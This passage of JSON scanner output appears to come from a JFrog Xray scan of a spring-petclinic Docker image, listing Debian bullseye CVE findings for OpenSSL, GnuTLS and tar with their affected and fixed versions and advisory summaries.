         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Issue summary: Some non-default TLS server configurations can cause unbounded\nmemory growth when processing TLSv1.3 sessions\n\nImpact summary: An attacker may exploit certain server configurations to trigger\nunbounded memory growth that would lead to a Denial of Service\n\nThis problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is\nbeing used (but not if early_data support is also configured and the default\nanti-replay protection is in use). In this case, under certain conditions, the\nsession cache can get into an incorrect state and it will fail to flush properly\nas it fills. The session cache will continue to grow in an unbounded manner. A\nmalicious client could deliberately create the scenario for this failure to\nforce a Denial of Service. It may also happen by accident in normal operation.\n\nThis issue only affects TLS servers supporting TLSv1.3. It does not affect TLS\nclients.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL\n1.0.2 is also not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-2511"
                  }
               ],
               "description": "Issue summary: Some non-default TLS server configurations can cause unbounded memory growth when processing TLSv1.3 sessions  Impact summary: An attacker may exploit certain server configurations to trigger unbounded memory growth that would lead to a Denial of Service  This problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is being used (but not if early_data support is also configured and the default anti-replay protection is in use). In this case, under certain conditions, the session cache can get into an incorrect state and it will fail to flush properly as it fills. The session cache will continue to grow in an unbounded manner. A malicious client could deliberately create the scenario for this failure to force a Denial of Service. It may also happen by accident in normal operation.  This issue only affects TLS servers supporting TLSv1.3. It does not affect TLS clients.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL 1.0.2 is also not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-2511",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-597548",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Issue summary: Some non-default TLS server configurations can cause unbounded\nmemory growth when processing TLSv1.3 sessions\n\nImpact summary: An attacker may exploit certain server configurations to trigger\nunbounded memory growth that would lead to a Denial of Service\n\nThis problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is\nbeing used (but not if early_data support is also configured and the default\nanti-replay protection is in use). In this case, under certain conditions, the\nsession cache can get into an incorrect state and it will fail to flush properly\nas it fills. The session cache will continue to grow in an unbounded manner. A\nmalicious client could deliberately create the scenario for this failure to\nforce a Denial of Service. It may also happen by accident in normal operation.\n\nThis issue only affects TLS servers supporting TLSv1.3. It does not affect TLS\nclients.\n\nThe FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL\n1.0.2 is also not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:openssl:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-2511"
                  }
               ],
               "description": "Issue summary: Some non-default TLS server configurations can cause unbounded memory growth when processing TLSv1.3 sessions  Impact summary: An attacker may exploit certain server configurations to trigger unbounded memory growth that would lead to a Denial of Service  This problem can occur in TLSv1.3 if the non-default SSL_OP_NO_TICKET option is being used (but not if early_data support is also configured and the default anti-replay protection is in use). In this case, under certain conditions, the session cache can get into an incorrect state and it will fail to flush properly as it fills. The session cache will continue to grow in an unbounded manner. A malicious client could deliberately create the scenario for this failure to force a Denial of Service. It may also happen by accident in normal operation.  This issue only affects TLS servers supporting TLSv1.3. It does not affect TLS clients.  The FIPS modules in 3.2, 3.1 and 3.0 are not affected by this issue. OpenSSL 1.0.2 is also not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-2511",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-594374",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw was found in GnuTLS. The Minerva attack is a cryptographic vulnerability that exploits deterministic behavior in systems like GnuTLS, leading to side-channel leaks. In specific scenarios, such as when using the GNUTLS_PRIVKEY_FLAG_REPRODUCIBLE flag, it can result in a noticeable step in nonce size from 513 to 512 bits, exposing a potential timing side-channel.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u6"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28834",
                     "cwe": [
                        "CWE-327"
                     ],
                     "cwe_details": {
                        "CWE-327": {
                           "name": "Use of a Broken or Risky Cryptographic Algorithm",
                           "description": "The product uses a broken or risky cryptographic algorithm or protocol."
                        }
                     }
                  }
               ],
               "description": "A flaw was found in GnuTLS. The Minerva attack is a cryptographic vulnerability that exploits deterministic behavior in systems like GnuTLS, leading to side-channel leaks. In specific scenarios, such as when using the GNUTLS_PRIVKEY_FLAG_REPRODUCIBLE flag, it can result in a noticeable step in nonce size from 513 to 512 bits, exposing a potential timing side-channel.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28834",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-594364",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "A flaw has been discovered in GnuTLS where an application crash can be induced when attempting to verify a specially crafted .pem bundle using the \"certtool --verify-chain\" command.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libgnutls30",
         "source_id": "deb://debian:bullseye:libgnutls30",
         "source_comp_id": "deb://debian:bullseye:libgnutls30:3.7.1-5",
         "component_versions": {
            "id": "debian:bullseye:gnutls28",
            "vulnerable_versions": [
               "< 3.7.1-5+deb11u6"
            ],
            "fixed_versions": [
               "3.7.1-5+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-28835"
                  }
               ],
               "description": "A flaw has been discovered in GnuTLS where an application crash can be induced when attempting to verify a specially crafted .pem bundle using the \"certtool --verify-chain\" command.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2024-28835",
            "result": "not_covered"
         }
      },
      {
         "id": "XRAY-540509",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "In GNU tar before 1.35, mishandled extension attributes in a PAX archive can lead to an application crash in xheader.c.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:tar",
         "source_id": "deb://debian:bullseye:tar",
         "source_comp_id": "deb://debian:bullseye:tar:1.34+dfsg-1",
         "component_versions": {
            "id": "debian:bullseye:tar",
            "vulnerable_versions": [
               "< 1.34+dfsg-1+deb11u1"
            ],
            "fixed_versions": [
               "1.34+dfsg-1+deb11u1"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-39804"
                  }
               ],
               "description": "In GNU tar before 1.35, mishandled extension attributes in a PAX archive can lead to an application crash in xheader.c.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "",
            "vulnerability_id": "CVE-2023-39804",
            "result": "not_covered"
         }
      }
   ]
}
